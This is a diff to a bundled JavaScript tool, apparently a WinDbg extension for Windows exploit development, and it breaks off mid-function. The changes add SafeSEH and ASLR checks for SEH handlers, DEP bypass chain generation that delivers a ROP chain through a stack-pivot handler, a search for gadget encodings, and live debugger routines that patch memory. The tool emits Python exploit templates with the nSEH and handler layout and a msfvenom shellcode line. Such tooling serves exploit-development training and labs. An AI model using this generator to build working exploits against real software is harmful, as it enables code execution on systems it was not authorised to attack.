@@ -1870,6 +1870,13 @@ var osed_bundle = (() => {
   function readSehRecords(teb, maxRecords = 64, reader = readPointer) {
     return walkSehRecords(teb, maxRecords, reader).records;
   }
+  var IMAGE_DLLCHARACTERISTICS_NO_SEH = 1024;
+  function takesSehHandler(module) {
+    if ((module.dllCharacteristics & IMAGE_DLLCHARACTERISTICS_NO_SEH) !== 0) return { ok: false, why: "the image is marked NO_SEH, so the dispatcher refuses every handler in it" };
+    if (module.safeseh === "enabled") return { ok: false, why: "SafeSEH: only an address in the module's own handler table is called" };
+    if (module.aslr !== "disabled") return { ok: false, why: "ASLR: the handler is a constant in the payload and this base moves between runs" };
+    return { ok: true, why: module.safeseh === "disabled" ? "no SafeSEH table and a fixed base" : "no SafeSEH table could be read, and a fixed base" };
+  }
 
   // src/core/exploit_strategy_advisor.ts
   function adviseExploitStrategy(evidence) {
@@ -7362,10 +7369,10 @@ var osed_bundle = (() => {
         });
         continue;
       }
-      const dword = resolveStepDword(step);
-      if (dword === void 0) continue;
+      const dword2 = resolveStepDword(step);
+      if (dword2 === void 0) continue;
       if (badSet.size > 0) {
-        const bytes = dwordBytes(dword);
+        const bytes = dwordBytes(dword2);
         for (let pos = 0; pos < 4; pos++) {
           if (badSet.has(bytes[pos])) {
             hits.push({
@@ -7373,7 +7380,7 @@ var osed_bundle = (() => {
               byteOffset: byteOffset + pos,
               byte: bytes[pos],
               bytePosition: pos,
-              dwordHex: hex323(dword),
+              dwordHex: hex323(dword2),
               comment: step.comment
             });
           }
@@ -7595,7 +7602,7 @@ var osed_bundle = (() => {
     while (i < steps.length) {
       const step = steps[i];
       const espOffset = i * 4;
-      const dword = stepDwordHex(step);
+      const dword2 = stepDwordHex(step);
       if (step.placeholder) {
         trace.push({
           stepIndex: i,
@@ -7617,14 +7624,14 @@ var osed_bundle = (() => {
           trace.push({
             stepIndex: i,
             espOffset,
-            dwordHex: dword,
-            action: `GADGET: ${dword} \u2014 ${step.comment}`,
+            dwordHex: dword2,
+            action: `GADGET: ${dword2} \u2014 ${step.comment}`,
             kind: "gadget",
             registersAfter: cloneRegs(regs),
             sideEffects: [],
-            notes: [`Address ${dword} not found in corpus \u2014 cannot trace instructions`]
+            notes: [`Address ${dword2} not found in corpus \u2014 cannot trace instructions`]
           });
-          assumptions.push(`Gadget at ${dword} not in corpus; register effects unknown from step ${i} onward`);
+          assumptions.push(`Gadget at ${dword2} not in corpus; register effects unknown from step ${i} onward`);
           i++;
           continue;
         }
@@ -7645,7 +7652,7 @@ var osed_bundle = (() => {
         trace.push({
           stepIndex: i,
           espOffset,
-          dwordHex: dword,
+          dwordHex: dword2,
           action: `GADGET: ${instrText}`,
           kind: "gadget",
           registersAfter: cloneRegs(regs),
@@ -7698,7 +7705,7 @@ var osed_bundle = (() => {
       trace.push({
         stepIndex: i,
         espOffset,
-        dwordHex: dword,
+        dwordHex: dword2,
         action: isPadding ? `PADDING: ${step.comment}` : `VALUE: ${step.comment}`,
         kind: isPadding ? "padding" : "frame-value",
         registersAfter: cloneRegs(regs),
@@ -11835,10 +11842,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-23T04:40:00.216Z" : globalThis[key2];
+        value = true ? "2026-11-23T06:01:58.266Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "14d0e2809954" : globalThis[key2];
+        value = true ? "6f388c4bb71e" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -12376,37 +12383,13 @@ var osed_bundle = (() => {
     const blocked2 = new Set(exclude);
     return !addressBytes(address, pointerSize).some((value) => blocked2.has(value));
   }
-  function scoreFinding(badcharSafe, aslr, safeseh) {
-    let score = 0;
-    const reasons = [];
-    if (badcharSafe) {
-      score += 35;
-      reasons.push("address bytes avoid excluded badchars");
-    } else {
-      score -= 40;
-      reasons.push("address bytes contain excluded badchars");
-    }
-    if (aslr === "disabled") {
-      score += 25;
-      reasons.push("module has ASLR disabled");
-    } else if (aslr === "unknown") {
-      score += 5;
-      reasons.push("module ASLR state unknown");
-    } else {
-      score -= 20;
-      reasons.push("module has ASLR enabled");
-    }
-    if (safeseh === "disabled") {
-      score += 30;
-      reasons.push("module SafeSEH is disabled");
-    } else if (safeseh === "unknown") {
-      score += 10;
-      reasons.push("module SafeSEH state unknown");
-    } else {
-      score -= 40;
-      reasons.push("module SafeSEH is enabled");
-    }
-    return { score, reasons };
+  function scoreFinding(badcharSafe, module) {
+    const takes = takesSehHandler(module);
+    const reasons = [
+      badcharSafe ? "address bytes avoid excluded badchars" : "address bytes contain excluded badchars",
+      `${takes.ok ? "the dispatcher calls a handler here" : "the dispatcher never calls a handler here"}: ${takes.why}`
+    ];
+    return { score: (badcharSafe ? 35 : -40) + (takes.ok ? 55 : -100), reasons };
   }
   function normalizeMode(value) {
     return value === "thorough" ? "thorough" : "fast";
@@ -12425,7 +12408,7 @@ var osed_bundle = (() => {
         mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
       },
       execute(options) {
-        var _a2, _b, _c, _d, _e, _f, _g;
+        var _a2, _b, _c, _d, _e, _f, _g, _h;
         const pointerSize = getPointerSize();
         const normalizedExclude = normalizeByteArray((_a2 = options.exclude) != null ? _a2 : []);
         const executableOnly = (_b = options.executableOnly) != null ? _b : true;
@@ -12474,12 +12457,12 @@ var osed_bundle = (() => {
             const aslr = (_e = moduleInfo == null ? void 0 : moduleInfo.aslr) != null ? _e : "unknown";
             const safeseh = (_f = moduleInfo == null ? void 0 : moduleInfo.safeseh) != null ? _f : "unknown";
             const badcharSafe = isBadcharSafe(hit, pointerSize, normalizedExclude.values);
-            const scored = scoreFinding(badcharSafe, aslr, safeseh);
+            const scored = scoreFinding(badcharSafe, { aslr, safeseh, dllCharacteristics: (_g = moduleInfo == null ? void 0 : moduleInfo.dllCharacteristics) != null ? _g : 0 });
             findings.push({
               address: hit,
               module: moduleName,
               module_offset: moduleOffset2,
-              instructions: (_g = validated.mnemonic) != null ? _g : "pop ? ; pop ? ; ret",
+              instructions: (_h = validated.mnemonic) != null ? _h : "pop ? ; pop ? ; ret",
               badchar_safe: badcharSafe,
               aslr,
               safeseh,
@@ -12522,7 +12505,12 @@ var osed_bundle = (() => {
             score: `${finding.score}`
           }))
         );
-        whyItMatters("Reliable pop-pop-ret selection is central to practical SEH overwrite exploitation.");
+        for (const reason of [...new Set(findings.map((finding) => finding.reasons[1]))]) {
+          const count = findings.filter((finding) => finding.reasons[1] === reason).length;
+          info(`${count} of ${findings.length}: ${reason}`);
+        }
+        info("A pop-pop-ret returns into the record on the stack, so with DEP on it is not the delivery: the handler has to be a gadget that moves ESP into the buffer and returns there. dep_plan measures that ESP and picks the pivot.");
+        whyItMatters("Reliable pop-pop-ret selection is central to practical SEH overwrite exploitation without DEP.");
         return {
           command: "seh_ppr",
           args: __spreadProps(__spreadValues({}, options), {
@@ -14135,7 +14123,7 @@ var osed_bundle = (() => {
       (byFirst[encoding[0]] = (_a3 = byFirst[encoding[0]]) != null ? _a3 : []).push(index);
     });
     const longest = Math.max(1, ...encodings.map((encoding) => encoding.length));
-    const result3 = { hits: [], dirty: encodings.map(() => 0), bytes: 0 };
+    const result3 = { hits: [], dirty: encodings.map(() => /* @__PURE__ */ new Set()), bytes: 0 };
     const kept = encodings.map(() => 0);
     for (const section2 of forEachSection({ module, executableOnly: true, maxResults: 0, chunkSize: 16384 }).sections) {
       for (let offset = 0; offset < section2.size; offset += 16384) {
@@ -14150,7 +14138,7 @@ var osed_bundle = (() => {
             if (i + encoding.length > bytes.length || encoding.some((byte, j) => byte >= 0 && bytes[i + j] !== byte)) continue;
             const address = start + BigInt(i);
             if (!clean2(address)) {
-              result3.dirty[index] += 1;
+              result3.dirty[index].add(Number(address));
               continue;
             }
             if (kept[index] >= keep) continue;
@@ -15566,19 +15554,31 @@ var osed_bundle = (() => {
     LOAD_REGISTER: (register2) => NOT_ESP.filter((r) => register2 === void 0 || REGS3[r] === register2).map((r) => [88 + r]),
     DISPATCH_PUSHAD: () => [[96]]
   };
+  var JOB_TAIL = 4;
   function encodingsFor(job) {
+    const tails = Array.from({ length: JOB_TAIL + 1 }, (_, n) => Array.from({ length: n }, () => -1));
     return job.capabilities.flatMap((kind) => {
       var _a2, _b;
       return (_b = (_a2 = BODIES[kind]) == null ? void 0 : _a2.call(BODIES, job.register)) != null ? _b : [];
-    }).flatMap((body) => [[...body, 195], [...body, 194, -1, -1]]);
+    }).flatMap((body) => tails.flatMap((tail) => [[...body, ...tail, 195], [...body, ...tail, 194, -1, -1]]));
   }
+  var SHOWN_HITS = 2;
   function settledLines(plan, settled, exclude) {
-    const searched = `      searched: all ${settled.encodings} plain encodings of this job, in every byte of ${settled.modules}`;
+    const searched = `      searched: all ${settled.encodings} encodings of this job, up to ${JOB_TAIL} bytes before the ret, in every byte of ${settled.modules}`;
     if (plan.pick) {
-      return settled.clean.indexOf(gadgetAddress(plan.pick.gadget)) >= 0 ? ["      the scan had missed it, and this search found it", searched] : [];
+      return settled.clean.some((hit) => hit.address === gadgetAddress(plan.pick.gadget)) ? ["      the scan had missed it, and this search found it", searched] : [];
     }
-    const usable = settled.clean.filter((address) => exclude.indexOf(address) < 0);
+    const usable = settled.clean.filter((hit) => exclude.indexOf(hit.address) < 0);
     if (settled.clean.length > 0 && usable.length === 0) return ["      absent but for what you excluded: every hit is one of them", searched];
+    const ranked2 = plan.verdicts.map((verdict) => gadgetAddress(verdict.gadget));
+    const unjudged = usable.filter((hit) => ranked2.indexOf(hit.address) < 0);
+    if (unjudged.length > 0) return [
+      `      ${usable.length} hit(s) at a clean address and none fits; ${unjudged.length} the ranking never saw, because the job's own`,
+      "      instruction is not the whole gadget there:",
+      ...unjudged.slice(0, SHOWN_HITS).map((hit) => `        ${hex325(hit.address)}  ${hit.sequence}`),
+      ...unjudged.length > SHOWN_HITS ? [`        ${unjudged.length - SHOWN_HITS} more`] : [],
+      searched
+    ];
     if (settled.clean.length > 0) return [`      ${settled.clean.length} hit(s) at a clean address, and none of them fits either`, searched];
     return [`      absent: ${settled.dirty > 0 ? `${settled.dirty} hit(s), every one at an address holding a bad byte` : "no hit at all"}`, searched];
   }
@@ -15599,6 +15599,65 @@ var osed_bundle = (() => {
   function depPlanArgs(args) {
     const short = typeof args[0] === "string" && /^\s*((\\x|0x)?[0-9a-f]{2}[\s,]*)+$/i.test(args[0]);
     return short ? ["", "", args[0], "auto", args[1], args[2], args[3]] : args;
+  }
+
+  // src/commands/dep_delivery.ts
+  function handlerCandidates(gadgets, accepted) {
+    const found = [];
+    for (const gadget of gadgets) {
+      const last = gadget.instructions[gadget.instructions.length - 1];
+      const land = stackMove(gadget);
+      if (!last || last.mnemonic !== "ret" || land === void 0) continue;
+      if (gadget.instructions.some((instruction) => instruction.mnemonic === "push")) continue;
+      if (dereferencedRegisters(gadget, "").length > 0 || memoryWrites(gadget, "").length > 0) continue;
+      const retn = last.operands.length === 1 ? parseInt(last.operands[0], last.operands[0].indexOf("0x") === 0 ? 16 : 10) || 0 : 0;
+      const address = gadgetAddress(gadget);
+      if (land - retn <= 0 || !accepted(address) || found.some((pivot) => pivot.address === address)) continue;
+      found.push({ address, sequence: sequence(gadget), land: land - retn, retn });
+    }
+    return found.sort((a, b) => a.land - b.land || a.retn - b.retn || a.address - b.address);
+  }
+  function landingPivots(candidates2, sehEsp, faultBelow) {
+    return candidates2.filter((pivot) => pivot.land > faultBelow && pivot.land < sehEsp).filter((pivot, i, all) => all.findIndex((other) => other.land === pivot.land) === i);
+  }
+  function measureTail(record, read, limit = 16384) {
+    const start = record + 8 >>> 0;
+    const byte = read(start);
+    if (byte === void 0) return { how: `the byte after the handler, at ${hex325(start)}, is unreadable` };
+    let length = 0;
+    while (length < limit && read(start + length >>> 0) === byte) length += 1;
+    if (length < 4) return { how: `the crash input past the handler at ${hex325(start)} is not a run of one byte` };
+    return { tail: length, how: `the crash wrote 0x${length.toString(16).toUpperCase()} bytes of 0x${byte.toString(16).toUpperCase().padStart(2, "0")} past the handler (db ${hex325(start)})` };
+  }
+  function deliveryLines(delivery, lead, retGap) {
+    if (delivery.kind === "ret") return ["CHAIN_AT = OFFSET                  # the chain starts on the saved EIP", retGap];
+    const pivots2 = delivery.pivots.length === 0 ? ["SEH_PIVOTS = []"] : [
+      "SEH_PIVOTS = [                     # (handler, where its ret lands above that ESP, its ret N), lowest first",
+      ...delivery.pivots.map((pivot) => `    (${hex325(pivot.address)}, 0x${pivot.land.toString(16).toUpperCase()}, ${pivot.retn}),${" ".repeat(Math.max(1, 12 - pivot.land.toString(16).length - String(pivot.retn).length))}# ${pivot.sequence}`),
+      "]"
+    ];
+    return [
+      "# OFFSET is the nSEH offset: the chain arrives through the SEH handler, a pivot into the buffer below it",
+      delivery.sehEsp === void 0 ? `SEH_ESP = hole("SEH_ESP")     # ${delivery.how}` : `SEH_ESP = 0x${delivery.sehEsp.toString(16).toUpperCase()}${" ".repeat(Math.max(1, 23 - delivery.sehEsp.toString(16).length))}# the record sits this far above ESP when the handler runs: [6/7]`,
+      ...pivots2,
+      delivery.tail === void 0 ? `SEH_TAIL = hole("SEH_TAIL")   # ${delivery.tailHow}` : `SEH_TAIL = 0x${delivery.tail.toString(16).toUpperCase()}${" ".repeat(Math.max(1, 22 - delivery.tail.toString(16).length))}# bytes the crash wrote past the handler: the payload faults the same way`,
+      "def seh_pivot(lead):                # the lowest landing that leaves `lead` bytes of the buffer below the chain",
+      "    for handler, land, retn in SEH_PIVOTS:",
+      "        if OFFSET - SEH_ESP + land >= lead: return handler, OFFSET - SEH_ESP + land, retn",
+      '    hole("a handler that lands in the buffer: every pivot lands below its start")',
+      "def seh_record(p):                  # the buffer up to OFFSET, nSEH, the handler, then the bytes past it",
+      '    if len(p) > OFFSET: raise SystemExit("the payload runs 0x%X bytes into the SEH record" % (len(p) - OFFSET))',
+      "    return p.ljust(OFFSET, PAD) + p32(JUNK) + p32(HANDLER) + PAD * SEH_TAIL",
+      `HANDLER, CHAIN_AT, RET_GAP = seh_pivot(${lead})`
+    ];
+  }
+  function sehHoles(delivery) {
+    if (delivery.kind !== "seh") return [];
+    return [
+      ...delivery.sehEsp === void 0 ? [`SEH_ESP: ${delivery.how}`] : [],
+      ...delivery.pivots.length === 0 ? ["SEH_PIVOTS: no handler in a module without SafeSEH adds enough to ESP to land in the buffer: dx @$osed().rop.pivots()"] : [],
+      ...delivery.tail === void 0 ? [`SEH_TAIL: ${delivery.tailHow}`] : []
+    ];
   }
 
   // src/commands/dep_build.ts
@@ -15716,7 +15775,7 @@ var osed_bundle = (() => {
     ] } };
   }
   function buildExploit(input) {
-    var _a2, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l, _m, _n, _o;
+    var _a2, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l, _m, _n, _o, _p;
     const { api, style, index, badchars } = input;
     const stages = [];
     const nextStage = () => {
@@ -15728,6 +15787,8 @@ var osed_bundle = (() => {
     const JUNK = filler(badchars);
     const gap = (_c = (_b = input.landing) == null ? void 0 : _b.gap) != null ? _c : 0;
     const retGap = `RET_GAP = ${gap}${" ".repeat(Math.max(1, 25 - String(gap).length))}# ${(_e = (_d = input.landing) == null ? void 0 : _d.how) != null ? _e : "not measured: assumed 0, a plain ret"}`;
+    const delivery = (_f = input.delivery) != null ? _f : { kind: "ret" };
+    const placed = (lead) => deliveryLines(delivery, lead, retGap);
     const stagingText = (offset) => offset === 0 ? "STAGING" : `STAGING ${offset < 0 ? "-" : "+"} 0x${Math.abs(offset).toString(16).toUpperCase()}`;
     const table2 = [];
     const holes = [];
@@ -15928,7 +15989,7 @@ ${fix}`
     };
     const lone = () => rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
     const skipper = () => rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
-    const facts = { iatSlot: input.iatSlot, slotWritable: input.slotWritable, delta: (_f = input.delta) == null ? void 0 : _f.value, writable: input.writable, cave: input.cave, caveBytes: input.caveBytes };
+    const facts = { iatSlot: input.iatSlot, slotWritable: input.slotWritable, delta: (_g = input.delta) == null ? void 0 : _g.value, writable: input.writable, cave: input.cave, caveBytes: input.caveBytes };
     const goalOf = (slot2) => {
       switch (slot2.source.kind) {
         case "ropnop": {
@@ -15948,15 +16009,15 @@ ${fix}`
     const capture2 = pick2("capture");
     const add = pick2("add");
     const copy = pick2("copy");
-    const copyPath = (_g = input.plans.filter((plan) => plan.job.key === "copy")[0]) == null ? void 0 : _g.path;
+    const copyPath = (_h = input.plans.filter((plan) => plan.job.key === "copy")[0]) == null ? void 0 : _h.path;
     const read = pick2("read");
     const write2 = pick2("write");
     const advance = pick2("advance");
     const negate = pick2("negate");
     const pivot = pick2("pivot");
-    const field = (_h = fieldRegister(input.plans)) != null ? _h : "";
-    const valueRegister = (_i = write2 == null ? void 0 : write2.at.source) != null ? _i : "eax";
-    const writeOffset = (_j = write2 == null ? void 0 : write2.at.offset) != null ? _j : 0;
+    const field = (_i = fieldRegister(input.plans)) != null ? _i : "";
+    const valueRegister = (_j = write2 == null ? void 0 : write2.at.source) != null ? _j : "eax";
+    const writeOffset = (_k = write2 == null ? void 0 : write2.at.offset) != null ? _k : 0;
     const arithmetic = (register2, keep) => {
       var _a3;
       for (const kind of ["REGISTER_SUB", "REGISTER_ADD"]) {
@@ -16054,7 +16115,7 @@ ${fix}`
             const from = (_a4 = capture2.at.dest) != null ? _a4 : "";
             const route = cheapest([from, ...REGISTERS3.filter((r) => r !== from && keep.indexOf(r) < 0)].map((at) => {
               const there = moveOps(from, at, keep);
-              const sled = there ? sledOps(at, keep, "OFFSET + 4 * here") : void 0;
+              const sled = there ? sledOps(at, keep, "CHAIN_AT + 4 * here") : void 0;
               const back = sled ? moveOps(at, register2, keep) : void 0;
               return there && sled && back ? { there, sled, back } : void 0;
             }));
@@ -16096,7 +16157,7 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
       }
     };
     const SLED = [
-      { line: "chain_end = OFFSET + 4 * len(c)" },
+      { line: "chain_end = CHAIN_AT + 4 * len(c)" },
       { line: "def to_sled(base, gap, negated):    # what the pops need, so the value lands on the NOPs" },
       { line: "    distance = chain_end + gap - base" },
       { line: "    return neg(distance) if negated else distance" },
@@ -16143,8 +16204,8 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
           const value = (_a3 = literal2(slot2)) != null ? _a3 : hex6(dummies[i]);
           return `frame ${i === 0 ? " =" : "+="} p32(${value})${" ".repeat(Math.max(1, 14 - value.length))}# ${slot2.name}${literal2(slot2) ? "" : ", patched by the chain"}`;
         }),
-        "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP",
-        retGap
+        ...placed("len(frame)"),
+        "FRAME_AT = CHAIN_AT - len(frame)   # field 1 sits here, right below the chain"
       ];
       const keepField = copy && !copy.move ? [{ call: entry(copy.gadget, "keep the field address"), values: [] }] : !copy && copyPath ? copyPath.gadgets.map((gadget) => ({ call: entry(gadget, `move ${copyPath.from} into ${copyPath.to}`), values: [] })) : void 0;
       if (!capture2 || !keepField || !write2 || !pivot) {
@@ -16152,11 +16213,11 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
       } else {
         const fns = frame.map((slot2) => literal2(slot2) ? void 0 : defineLoader(slot2, valueRegister, [field]));
         chain.push(group("the captured ESP, and the address of field 1"));
-        chain.push({ line: `# ${field} = field 1 - ${hex6(writeOffset)}: the captured ESP is buffer offset OFFSET + 4 + RET_GAP, field 1 is FRAME_AT` });
+        chain.push({ line: `# ${field} = field 1 - ${hex6(writeOffset)}: the captured ESP is buffer offset CHAIN_AT + 4 + RET_GAP, field 1 is FRAME_AT` });
         chain.push({ line: `# confirm: bp ${hex6(gadgetAddress(capture2.gadget))} ; g ; r esp ; s -d esp-400 L100 ${(dummies[0] >>> 0).toString(16)}` });
         chain.push({ call: entry(capture2.gadget, "capture ESP"), values: [] });
         const distance = -(4 * frame.length + 4 + gap + writeOffset);
-        const before = offsetBy((_k = capture2.at.dest) != null ? _k : "", distance, [], "field 1", add == null ? void 0 : add.gadget);
+        const before = offsetBy((_l = capture2.at.dest) != null ? _l : "", distance, [], "field 1", add == null ? void 0 : add.gadget);
         const after = "missing" in before ? offsetBy(field, distance, [], "field 1", add == null ? void 0 : add.gadget) : before;
         if (!("missing" in before)) chain.push(...before, ...keepField);
         else chain.push(...keepField, ..."missing" in after ? hole("distance", after.missing) : after);
@@ -16180,7 +16241,7 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
         });
         const pops = popsAfterPivot(pivot.gadget);
         const delta = writeOffset - 4 * at - 4 * pops;
-        const target = (_l = pivot.at.source) != null ? _l : "";
+        const target = (_m = pivot.at.source) != null ? _m : "";
         const tried = [valueRegister, target, ...REGISTERS3].filter((r, i, all) => all.indexOf(r) === i).map((at2) => {
           const there = moveOps(field, at2, []);
           const shift = there ? offsetBy(at2, delta, [], "the pivot") : { missing: `no way to move the field address into ${at2}` };
@@ -16209,11 +16270,11 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
       const frame = FRAMES[api];
       const staging = input.staging;
       const span = 4 * frame.length;
-      const addrRegister = (_m = write2 == null ? void 0 : write2.at.address) != null ? _m : "";
+      const addrRegister = (_n = write2 == null ? void 0 : write2.at.address) != null ? _n : "";
       frameBlock = staging === void 0 ? [] : [
         `STAGING = ${hex6(staging)}      # the frame is laid here: ${span} writable bytes in ${input.module}`,
         ...frame.map((slot2, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot2.name}${i === 0 ? "   <- the pivot's ret enters the call here" : ""}`),
-        retGap
+        ...placed("0")
       ];
       if (staging === void 0 || !write2 || !pivot) {
         chain.push(...hole("payload", staging === void 0 ? `no run of ${span} writable bytes in ${input.module} with every field address free of the bad chars: the chain pops each one
@@ -16241,7 +16302,7 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
           routes.push(`${addrRegister} = each field address: ${route}. ${frame.length} constants, ${stagingText(-writeOffset)} to ${stagingText(span - 4 - writeOffset)}`);
         }
         const pops = popsAfterPivot(pivot.gadget);
-        const target = (_n = pivot.at.source) != null ? _n : "";
+        const target = (_o = pivot.at.source) != null ? _o : "";
         chain.push(group("pivot: ESP onto the frame"));
         chain.push({ line: `# ${target} = ${stagingText(-4 * pops)}, so the ret after the pivot lands on field 1` });
         const pivotOps = reachOps(target, constVal(staging - 4 * pops >>> 0, stagingText(-4 * pops)), [], "the pivot");
@@ -16252,7 +16313,7 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
           group("the shellcode address, into the slot the loader marked"),
           ...SLED,
           { line: "" },
-          { line: 'payload  = PAD * OFFSET + b"".join(p32(w) for w in c)' },
+          { line: 'payload  = PAD * CHAIN_AT + b"".join(p32(w) for w in c)' },
           { line: "payload += PAD * gap + nops + shellcode" }
         );
       }
@@ -16278,10 +16339,10 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
         loaded.push((_b2 = slot2.register) != null ? _b2 : "eax");
         return fn;
       });
-      frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot2) => `${slot2.register} = ${slot2.name}`).join(", ")}`, retGap];
+      frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot2) => `${slot2.register} = ${slot2.name}`).join(", ")}`, ...placed("0")];
       const dispatch = pick2("pushad");
       chain.push(group("the seven registers, in the order [6/7] fixes"));
-      for (const fn of order) chain.push({ line: `# ${(_o = briefs[fn]) != null ? _o : fn}` });
+      for (const fn of order) chain.push({ line: `# ${(_p = briefs[fn]) != null ? _p : fn}` });
       chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
       chain.push(group("dispatch: pushad writes the whole frame at once"));
       if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
@@ -16308,11 +16369,11 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
         chain.push(group("the dwords the call reads after the pushad gadget"));
         chain.push({ line: `c.extend([${tail.join(", ")}])` });
       }
-      chain.push({ line: "" }, { line: 'payload = PAD * OFFSET + b"".join(p32(w) for w in c) + nops + shellcode' });
+      chain.push({ line: "" }, { line: 'payload = PAD * CHAIN_AT + b"".join(p32(w) for w in c) + nops + shellcode' });
     }
     assignNames(table2);
     const resolve = (text) => text.replace(/\u0001(\d+)\u0001/g, (_, i) => refs[Number(i)].name);
-    const dword = (value) => {
+    const dword2 = (value) => {
       if (value.k === void 0 || isClean(value.k, badchars)) return resolve(value.text);
       const name = `${resolve(value.text)} = ${hex6(value.k)}`;
       holes.push(`${name}: holds a bad byte, and no route here builds it`);
@@ -16320,7 +16381,7 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
     };
     const render = (ops, indent) => ops.map((op5) => {
       if ("line" in op5) return op5.line === "" ? "" : `${indent}${resolve(op5.line)}`;
-      const call = `c.rop(${[op5.call.name, ...op5.values.map(dword)].join(", ")})`;
+      const call = `c.rop(${[op5.call.name, ...op5.values.map(dword2)].join(", ")})`;
       const line = `${indent}${op5.times && op5.times > 1 ? `for _ in range(${op5.times}): ${call}` : call}`;
       return op5.note ? `${line}${" ".repeat(Math.max(2, 44 - line.length))}# ${resolve(op5.note)}` : line;
     });
@@ -16337,15 +16398,16 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
         ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
         ...sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : [],
         "c = Chain()",
-        "c.skip = RET_GAP                 # junk after the first gadget for the bytes the crashing ret skips: [6/7]",
+        "c.skip = RET_GAP                 # junk after the first gadget for the bytes the ret into it skips: [6/7]",
         ...render(chain, ""),
+        ...delivery.kind === "seh" ? ["payload = seh_record(payload)   # nSEH and the handler at OFFSET: [6/7]"] : [],
         "return sendable(payload)"
       ].map((line) => line === "" ? "" : `    ${line}`)
     ];
     return {
       table: table2,
       stages,
-      holes: slot.hole ? [slot.hole, ...holes] : holes,
+      holes: [...slot.hole ? [slot.hole] : [], ...holes, ...sehHoles(delivery)],
       routes: routes.map(resolve),
       blocks: {
         1: HELPER_BLOCK,
@@ -16600,6 +16662,73 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
         for (const line of lines) print(line);
         return { command: "dep_function", args: { method, style }, success: true, findings: [{ method, style, lines }], warnings: [], errors: [] };
       }
+    };
+  }
+
+  // src/commands/dep_delivery_live.ts
+  var dword = (address) => {
+    const bytes = tryReadMemory(BigInt(address >>> 0), 4);
+    return bytes && bytes.length === 4 ? (bytes[0] | bytes[1] << 8 | bytes[2] << 16 | bytes[3] << 24) >>> 0 : void 0;
+  };
+  var readByte = (address) => {
+    var _a2;
+    return (_a2 = tryReadMemory(BigInt(address >>> 0), 1)) == null ? void 0 : _a2[0];
+  };
+  function sehAtCrash() {
+    var _a2;
+    if (getPointerSize() !== 4) return void 0;
+    const regs = readRegisters(4);
+    if (regs.ip === void 0 || regs.sp === void 0) return void 0;
+    const eip = Number(regs.ip) >>> 0;
+    const eipModule = findModuleByAddress(BigInt(eip));
+    if (!eipModule) return void 0;
+    const teb = resolveTeb32Address(host.currentThread);
+    if (!teb) return void 0;
+    const first = walkSehRecords(teb, 1).records[0];
+    if (!first || findModuleByAddress(first.handler)) return void 0;
+    const file = (_a2 = eipModule.name.split(/[\\/]/).pop()) != null ? _a2 : eipModule.name;
+    return { record: Number(first.node) >>> 0, handler: Number(first.handler) >>> 0, eip, esp: Number(regs.sp) >>> 0, teb: Number(teb) >>> 0, eipModule: file };
+  }
+  var GPRS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp", "eip", "efl"];
+  var BP_ID = 77;
+  function measureHandlerEsp(crash, handler) {
+    const slot = crash.record + 4 >>> 0;
+    const original = dword(slot);
+    const head = dword(crash.teb);
+    if (original === void 0 || head === void 0) return { how: `the record at ${hex325(crash.record)} or the SEH head is unreadable` };
+    const saved = readRegisters(4).all.filter((entry) => GPRS.indexOf(entry.name.toLowerCase()) >= 0);
+    const run = (command2) => {
+      try {
+        return executeDebuggerCommand(command2);
+      } catch (_error) {
+        return [];
+      }
+    };
+    let esp;
+    let stopped;
+    try {
+      run(`ed ${hex325(slot)} ${hex325(handler)}`);
+      run(`bp${BP_ID} ${hex325(handler)}`);
+      for (let tries = 0; tries < 2; tries += 1) {
+        run("g");
+        const after = readRegisters(4);
+        stopped = after.ip === void 0 ? void 0 : Number(after.ip) >>> 0;
+        if (stopped === handler && after.sp !== void 0) esp = Number(after.sp) >>> 0;
+        if (stopped !== crash.eip) break;
+      }
+    } finally {
+      run(`bc ${BP_ID}`);
+      run(`ed ${hex325(slot)} ${hex325(original)}`);
+      run(`ed ${hex325(crash.teb)} ${hex325(head)}`);
+      for (const entry of saved) run(`r ${entry.name.toLowerCase()}=${hex325(Number(entry.value) >>> 0)}`);
+    }
+    if (esp === void 0) {
+      return { how: `not measured: with ${hex325(handler)} as the handler, g stopped at ${stopped === void 0 ? "nothing readable" : hex325(stopped)}, not on it` };
+    }
+    return {
+      esp,
